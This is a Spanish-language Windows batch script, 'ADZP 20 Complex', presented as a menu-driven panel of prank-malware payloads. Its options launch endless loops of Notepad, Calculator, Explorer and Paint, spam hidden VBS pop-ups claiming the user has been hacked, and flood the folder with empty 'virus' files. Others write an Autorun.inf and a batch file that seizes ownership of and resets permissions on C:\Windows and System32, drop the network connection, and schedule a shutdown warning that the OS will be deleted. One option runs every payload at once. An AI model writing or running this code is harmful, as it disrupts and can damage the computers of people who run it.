:: ADZP 20 Complex Clean Version
:: This Software Considered Semi-Dangerous

@echo off
title ADZP 20 Clean - Payload Panel
color f
:Menu
cls
echo.
echo.                                              Shingapi.sk \ ADZP 20 Complex Clean
echo.
echo.                 ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
echo.                 ³                                                                                      ³
echo.                 ³    1.[Abrir Aplicaciones Aleatorias]             2.[Crear Archivos Inservibles]      ³
echo.                 ³                                                                                      ³
echo.                 ³                                                                                      ³
echo.                 ³    3.[Mensajes de Spam]                          4.[Crear Archivos Peligrosos]       ³
echo.                 ³                                                                                      ³
echo.                 ³                                                                                      ³
echo.                 ³    5.[Anular la Conexion]                        6.[Apagar la Computadora]           ³
echo.                 ³                                                                                      ³
echo.                 ³ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ³
echo.                 ³                                                                                      ³
echo.                 ³                      7.[Activar Todos los Payloads a la Vez]                         ³
echo.                 ³                                                                                      ³
echo.                 ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
echo.
set /p payload=".                                                    Opcion > "
if %payload% == 1 (goto Advertencia)
if %payload% == 2 (goto SocketFiles)
if %payload% == 3 (goto MsgSpamBox)
if %payload% == 4 (goto Advertencia2)
if %payload% == 5 (goto Advertencia3)
if %payload% == 6 (goto Shutdown)
if %payload% == 7 (goto Advertencia4)

:Advertencia
cls
echo.
echo.
echo.             Este Payload puede ser Peligroso para tu PC, Realmente Quieres Ejecutarlo? 
echo.
echo.
set /p op=.            Opcion [S - N]: 
if %op% == S (goto RandomApps)
if %op% == N (goto Menu)
goto Advertencia

:RandomApps
cls
echo.
echo.
echo.
echo.
echo.                                   Para detener la Ejecucion del Payload Cierra el Programa
echo.
echo.
echo.
echo.
:RandomAppsOpen
start notepad
start calc
start explorer.exe
start mspaint.exe
goto RandomAppsOpen

:MsgSpamBox
if exist Informacion.vbs (attrib -h Informacion.vbs & del /f /q /s Informacion.vbs) >nul
if exist ErrorCritico.vbs (attrib -h ErrorCritico.vbs & del /f /q /s ErrorCritico.vbs) >nul
if exist Advertencia.vbs (attrib -h Advertencia.vbs & del /f /q /s Advertencia.vbs) >nul
echo off>>ErrorCritico.vbs
attrib +h ErrorCritico.vbs
echo Mensaje=msgbox("Error Critico",16,"Error")>>ErrorCritico.vbs
echo off>>Advertencia.vbs
attrib +h Advertencia.vbs
echo Mensaje=msgbox("Error en el Sistema",48,"Error")>>Advertencia.vbs
echo off>>Informacion.vbs
attrib +h Informacion.vbs
echo Mensaje=MsgBox("Has Sido Hackeado!",64,"ADZP 20 Complex")>>Informacion.vbs
timeout /t 1 >nul
start Informacion.vbs
cls
echo.
echo.
echo.
echo.
echo.                                   Para detener la Ejecucion del Payload Cierra el Programa
echo.
echo.
echo.
echo.
:SpamMensajeBoxes
start ErrorCritico.vbs
start Advertencia.vbs
goto SpamMensajeBoxes

:SocketFiles
cls
echo.
echo.
echo.
echo.
echo.                                   Para detener la Ejecucion del Payload Cierra el Programa
echo.
echo.
echo.
echo.
:CreateSocketFiles
echo off>>virus.exe
echo off>>virus.dll
echo off>>virus.com
echo off>>virus.ini
echo off>>virus.inf
echo off>>virus.sys
echo off>>virus.reg
echo off>>virus.ani
echo off>>virus.rar
echo off>>virus.pal
echo off>>virus.bin
echo off>>virus.cmd
echo off>>virus.jar
echo off>>virus.chk
echo off>>virus.db
echo off>>virus.ocx
echo off>>virus.manifest
echo off>>virus.log
echo off>>virus.dat
echo off>>virus.cur
echo off>>virus.386
echo off>>virus.323
echo off>>virus.scr
echo off>>virus.acm
echo off>>virus.cpl
echo off>>virus.hlp
echo off>>virus.jpg
echo off>>virus.mpg
echo off>>virus.html
echo off>>virus.vbs
echo off>>virus.drv
echo off>>virus.wsh
echo off>>virus.rat
echo off>>virus.cer
echo off>>virus.msc
echo off>>virus.db
goto CreateSocketFiles

:Advertencia2
cls
echo.
echo.
echo.             Este Payload puede ser Peligroso para tu PC, Realmente Quieres Ejecutarlo? 
echo.
echo.
set /p op=.            Opcion [S - N]: 
if %op% == S (goto CreateDangerousFiles)
if %op% == N (goto Menu)
goto Advertencia2

:CreateDangerousFiles
echo off>>Autorun.inf
echo [AutoRun]>>Autorun.inf
echo Open=ADZP 20 Complex>>Autorun.inf
echo Action=Start ADZP 20 Complex>>Autorun.inf
echo Label=???>>Autorun.inf
echo off>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo off>>Taskdl.bat
echo @echo off>>Taskdl.bat
echo title Taskdl>>Taskdl.bat
echo takeown /f "C:\Windows\System32" /r>>Taskdl.bat
echo icacls "C:\Windows\System32" /reset /t /c /q>>Taskdl.bat
echo takeown /f "C:\Windows" /r>>Taskdl.bat
echo icacls "C:\Windows" /reset /t /c /q>>Taskdl.bat
msg * Se han Creado los Archivos
goto Menu

:Advertencia3
cls
echo.
echo.
echo.             Este Payload puede ser Peligroso para tu PC, Realmente Quieres Ejecutarlo? 
echo.
echo.
set /p op=.            Opcion [S - N]: 
if %op% == S (goto InstantKillEthernet)
if %op% == N (goto Menu)
goto Advertencia3

:InstantKillEthernet
ipconfig /release >nul
msg * Se ha Anulado la Conexion a Internet
goto Menu

:Shutdown
shutdown -s -t 60 -c "ADZP 20 Complex esta a punto de eliminar el Sistema Operativo"
cls
echo.
echo.
echo.
echo.
echo.
echo.                                Para Cancelar el Apagado Automatico Presiona una Tecla
echo.
echo.
pause >nul
shutdown -a
goto Menu

:Advertencia4
cls
echo.
echo.
echo.             Estas Seguro que Deseas Ejecutar todos los Payloads?
echo.
echo.
echo.             Si Ejecutas Todos los Payloads a la Vez Tu Computadora Podria dejar de Funcionar o Apagarse
echo.
echo.
set /p option=.            Opcion [S - N]: 
if %option% == S (goto ActivateAll)
if %option% == N (goto Menu)
goto Advertencia4

:ActivateAll
echo off>>Autorun.inf
echo [AutoRun]>>Autorun.inf
echo Open=ADZP 20 Complex>>Autorun.inf
echo Action=Start ADZP 20 Complex>>Autorun.inf
echo Label=???>>Autorun.inf
echo off>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Taskse.exe
echo off>>Taskdl.bat
echo @echo off>>Taskdl.bat
echo title Taskdl>>Taskdl.bat
echo takeown /f "C:\Windows\System32" /r>>Taskdl.bat
echo icacls "C:\Windows\System32" /reset /t /c /q>>Taskdl.bat
echo takeown /f "C:\Windows" /r>>Taskdl.bat
echo icacls "C:\Windows" /reset /t /c /q>>Taskdl.bat
if exist Informacion.vbs (attrib -h Informacion.vbs & del /f /q /s Informacion.vbs) >nul
if exist ErrorCritico.vbs (attrib -h ErrorCritico.vbs & del /f /q /s ErrorCritico.vbs) >nul
if exist Advertencia.vbs (attrib -h Advertencia.vbs & del /f /q /s Advertencia.vbs) >nul
echo off>>ErrorCritico.vbs
attrib +h ErrorCritico.vbs
echo Mensaje=msgbox("Error Critico",16,"Error")>>ErrorCritico.vbs
echo off>>Advertencia.vbs
attrib +h Advertencia.vbs
echo Mensaje=msgbox("Error en el Sistema",48,"Error")>>Advertencia.vbs
echo off>>Informacion.vbs
attrib +h Informacion.vbs
echo Mensaje=MsgBox("Has Sido Hackeado!",64,"ADZP 20 Complex")>>Informacion.vbs
start Informacion.vbs
start ErrorCritico.vbs
start Advertencia.vbs
start ErrorCritico.vbs
start Advertencia.vbs
start ErrorCritico.vbs
start Advertencia.vbs
msg * Virus Detectado
msg * Virus Detectado
msg * Virus Detectado
msg * Virus Detectado
msg * Has Sido Hackeado!
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
echo off>>virus.exe
echo off>>virus.dll
echo off>>virus.com
echo off>>virus.ini
echo off>>virus.inf
echo off>>virus.sys
echo off>>virus.reg
echo off>>virus.ani
echo off>>virus.rar
echo off>>virus.pal
echo off>>virus.bin
echo off>>virus.cmd
echo off>>virus.jar
echo off>>virus.chk
echo off>>virus.db
echo off>>virus.ocx
echo off>>virus.manifest
echo off>>virus.log
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
echo off>>virus.dat
echo off>>virus.cur
echo off>>virus.386
echo off>>virus.323
echo off>>virus.scr
echo off>>virus.acm
echo off>>virus.cpl
echo off>>virus.hlp
echo off>>virus.jpg
echo off>>virus.mpg
echo off>>virus.html
echo off>>virus.vbs
echo off>>virus.drv
echo off>>virus.wsh
echo off>>virus.rat
echo off>>virus.cer
echo off>>virus.msc
echo off>>virus.db
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start notepad
start calc
start explorer.exe
start mspaint.exe
start ErrorCritico.vbs
start Advertencia.vbs
start ErrorCritico.vbs
start Advertencia.vbs
start ErrorCritico.vbs
start Advertencia.vbs
start ErrorCritico.vbs
start Advertencia.vbs
start ErrorCritico.vbs
start Advertencia.vbs
shutdown -s -t 15 -c "ADZP 20 Complex esta a punto de eliminar el Sistema Operativo"
start Informacion.vbs
start ErrorCritico.vbs
start Advertencia.vbs
start ErrorCritico.vbs
start Advertencia.vbs
start ErrorCritico.vbs
start Advertencia.vbs
start Informacion.vbs
start ErrorCritico.vbs
start Advertencia.vbs
start ErrorCritico.vbs
start Advertencia.vbs
start ErrorCritico.vbs
start Advertencia.vbs
goto Menu